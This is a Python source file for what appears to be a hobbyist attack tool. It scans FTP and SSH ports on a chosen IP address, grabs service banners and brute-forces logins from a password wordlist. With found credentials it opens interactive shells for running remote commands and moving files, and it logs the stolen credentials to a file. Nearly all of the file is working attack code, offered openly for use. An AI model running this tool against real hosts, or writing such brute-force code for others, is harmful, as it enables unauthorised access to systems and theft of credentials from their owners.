import socket
import ftplib
import paramiko


creds = []
x = ""

def mybanner():
    banner = """
    __        __   _   
    \ \      / /__| | ___ ___  _ __ ___   ___
     \ \ /\ / / _ \ |/ __/ _ \| '_  _ \ / _  \ 
      \ V  V /  __/ | (_| (_) | | | | | |  __/
       \_/\_/ \___|_|\___\___/|_| |_| |_|\___|                                                      
      _   _ ____   _____  _____
     | | | / ___| |  ___||_   _|
     | | | \___ \ | |_     | |
     | |_| |___) ||  _|    | |
      \___/|____/ |_|      |_|"""
    print(banner)
    print("-"*35)



def brute_force_ssh(): #bruteforce ssh
    global wordlist, credits
    name = input("Enter Username: ") #username input
    plist = input("Enter Pass list or db path: ") #passlist input
    try: #tryint to open the passlist if exist in path
        wordlist = open(plist, "r")
    except FileNotFoundError:
        print("File Not Found, Try again..")
        brute_force_ssh()
    list = wordlist.read().replace("\n", " ")
    list = list.split(" ")
    for i in list:#running brute force on passwords in list with loop
        try:
            ses = paramiko.SSHClient()
            ses.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            print("Trying to connect {} with {}".format(name, i))
            ses.connect(I, 22, name, i)
            print("Connected To the server with \n{} and pass {}".format(name, i))
            ses_shell = input("\nDo you Wish to open Interactive shell?Y/N")
            if ses_shell.upper() == "Y": #starting shell with another function with the creds we found
                creds.append(name)
                creds.append(i)
                ssh_client()
            elif ses_shell.upper() == "N": #exiting save or leave
                saveme = input("Do you wish to save the credentials you found?Y/N")
                if saveme.upper() == "Y":
                    try:
                        credits = open("credentials.txt", "a")
                        c1 = "IP:{}, Port:22, Service SSH, Username:{}, Password:{}".format(I, name, i)
                        credits.write('IP:{}, Port:22, Service SSH, Username:{}, Password:{}\n'.format(I, name, i))
                        print("\nWriting Content to file credentials.txt\n")
                        credits.close()
                        main()
                    except Exception as err3: #printing file opening errors
                        print(err3)
                        print("Error Creating the file...\nRestarting\n")
                        credits.close()
                        main()
                elif saveme.upper() == "N":
                    print("Ok going back to the main program...")
                    main()
                else:
                    print("Wrong Input\nTry Again...\n\n") #kind of error handeling
        except paramiko.ssh_exception.NoValidConnectionsError: #service off
            print("\n" * 8)
            print("The Service is Off Can't Run")
            print("Restarting Program")
            print("\n"*3)
            main()
        except paramiko.ssh_exception.AuthenticationException: #wrong credentials error
            pass
    ret = input("\n\nCouldn't find the password in from the file"
                "\nPassword or User might be incorrect\n\n"
                "Do you wish to change the USERNAME/WORDLISTFILE?"
                "\n------------>")
    if ret.upper() == "Y": #retry with new pass file or username
        brute_force_ssh()
    else:
        main()


def ssh_client(): #connecting to ssh shell with creds
    try:
        shell = paramiko.SSHClient()
        username = creds[0]
        password = creds[1]
        shell.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        shell.connect(I, 22, username, password)
        print("Logged In {}".format(I))
        while True:
            command = input("Enter Command: ")
            stdin , stdout, stderr = shell.exec_command(command)
            print(stdout.read().decode())
            print(stderr.read().decode())
            if command == "exit":
                main()
    except paramiko.ssh_exception.NoValidConnectionsError:
        print("The SSH service is Down")
        scan()
    except paramiko.ssh_exception.AuthenticationException:
        print("Wrong Credentials")


def ftp_client(): #connecting ftp shell with creds we found or have
    try:
        session = ftplib.FTP()
        session.connect(I, 21)
        print("Trying to connect To-> {} with Pass-> {}".format(creds[0], creds[1]))
        session.login(creds[0], creds[1])
        print("Connected!")
        commands = "You can choose from this options:\n[-]pwd\n[-]dir\n[-]cwd\n[-]getf\n[-]putf\n[-]commands\n[-]exit"
        print(commands)
        while True:
            command = input("Input Command here: ")
            if command.lower() == "pwd":
                print("Current Working Directory is: " + session.pwd())
            elif command.lower() == "dir": #function to list dir
                print(session.dir())
            elif command.lower() == "cwd": #function to change dir
                path = input("Enter path for changing working dir: ")
                try:
                    session.cwd(path)
                except:
                    print("Wrong input\nTry Again")
                print(session.pwd())
            elif command.lower() == "getf": #function to get file
                file = input("Enter file name to download: ")
                try:
                    session.retrbinary('RETR '+ file, open(file, 'wb').write)
                    print("File Saved Successfully at the Current working path!")
                except FileNotFoundError:
                    print("Wrong input try again..")
            elif command.lower() == "putf": #function to upload file
                put = input("Enter file name to upload: ")
                try:
                    fileUpload = open(put, "rb")
                    session.storbinary("STOR " + put, fileUpload)
                    print("Uploaded file successfully")
                    fileUpload.close()
                except Exception as uploaderr:
                    print(uploaderr)
            elif command.lower() == "commands": #print commands available
                print(commands)
            elif command.lower() == "exit": #exit shell back to main
                print("Thank you, Bye Bye!")
                main()
            else:
                print("Invalid Input Try Again..")
    except ConnectionRefusedError: #connection down
        print("Connection is Down")
        scan()
    except socket.timeout: #connection timedout
        print("Connection Closed")
        scan()


def force(): #run ftp bruteforce
    global name, wordlist
    global i
    print("Lets get this PASSWORD!")
    name = input("Enter Username: ") #username
    plist = input("Enter Pass list or db path: ") #file path
    try:#try reading pass file
        wordlist = open(plist, "r")
    except FileNotFoundError:
        print("File Not Found, Try again..")
        force()
    list = wordlist.read().replace("\n", " ")
    list = list.split(" ")
    for i in list: #ftp brute force loop connection
        try:
            conn = ftplib.FTP(timeout=1)
            try:
                conn.connect(I, 21)
            except ConnectionRefusedError:
                print("Server or Port is down")
                main()
            print("Trying {} with pass {}".format(name, i))
            conn.login(name, i)
            print("Connected To the Server {}".format(I))
            print("Connected with USERNAME:{} and PASSWORD:{}".format(name, i)) #prints the working credentials
            creds.append(name)
            creds.append(i)
            print(creds) #prints creds list
            print(conn.pwd()) #print working directory in ftp client
            sh = input("Do you wish to Open Interactive Shell?Y/N\n") #shell or exit?
            if sh.lower() == "y":#connecting to ftp shell function
                conn.close()
                ftp_client()
                break
            elif sh.lower() == "n":#save creds or exit
                saveme = input("Do you wish to save the credentials you found?Y/N")
                if saveme.upper() == "Y":
                    try: #trying to open and save the creds in file
                        credits = open("credentials.txt", "a")
                        credits.write('IP:{}, Port:21, Service FTP, Username:{}, Password:{}\n'.format(I, name, i))
                        print("\nWriting Content to file credentials.txt\n")
                        print("Going back to the main menu...")
                        credits.close()
                        main()
                    except Exception as err4:#creating file error
                        print(err4)
                        print("Error Creating the file...\nRestarting\n")
                        main()
                else:
                    print("Thank you, ByeBye")
                    main()
        except ftplib.error_perm as leery: #if the credentials are wrong while bruteforcing it
            leery = str(leery)
            if "530" in leery:
                continue
        except socket.timeout:
            continue
    ret = input("\nThe Service is Down or\nCouldn't find the password in from the file"
                "\nPassword or User might be incorrect\n\n"
                "Do you wish to change the USERNAME/WORDLISTFILE?Y/N"
                "\n------------>")
    if ret.upper() == "Y":
        force()
    else:
        main()


def scan(): #scanning port 21 and 22
    global s
    global x
    global port
    ports = [21, 22]
    try:
        for port in ports:
            s = socket.socket()
            try:
                s.connect((I, port))
            except Exception as errs:
                print("Port {} is Closed".format(port) + "\n" + "-"*50)
                continue
            s.send("H".encode())
            buffer = s.recv(2048).decode() #getting the banner
            try:
                x = "Port {} is OPEN\n".format(port)
            except:
                print("Port {} is CLOSED\n".format(port) + "\n" + "-"*50)
            print(x)
            print("Banner: " + "\n" + buffer + "-"*50)
            s.close()
    except Exception:
        print("Port {} is CLOSED or Host is Down\n".format(port) + "\n" + "-"*50) #incase of error
        s.close()
    if "OPEN" in str(x):
        C = input("Do you wish to BruteForce The OPEN Service?Y/N\nYou can login straight if you have the creds already!\nTo login session write L\n------>")
        if C.upper() == "Y":
            ser = input("What service you wish to Bruteforce?\n1.FTP\n2.SSH\n----->")
            if ser == "1":
                force()
            elif ser == "2":
                brute_force_ssh()
            else:
                print("Wrong Input")
                scan()
        elif C.upper() == "L":
                c_a = input("What Service you wish to Connect? \n1.FTP\n2.SSH")
                if c_a == "1":
                    un = input("Enter USERNAME: ")
                    pa = input("Enter Password: ")
                    creds.append(un)
                    creds.append(pa)
                    ftp_client()
                elif c_a == "2":
                    un = input("Enter USERNAME: ")
                    pa = input("Enter Password: ")
                    creds.append(un)
                    creds.append(pa)
                    ssh_client()
                else:
                    print("Wrong Input")
                    scan()
        elif C.upper() == "N":
            print("Okay\nGoing back to menu")
            main()
        else:
            print("Wrong Input, Try again...")
            scan()
    else:
        print("Services are down")
        main()


def main(): #first banner
    global I
    mybanner()
    print("This tool was made by 0nks0\n")
    I = input("Write exit to quit program\nEnter IP Address: " + "\n-------> ")
    if I.lower() == "exit":
        print("Good \n\tBye!")
        print("by\n\t0nks0")
        quit()
    else:
        print("\n\nScanning PORTS 21 and 22")
        scan()


if __name__ == '__main__':
    main()
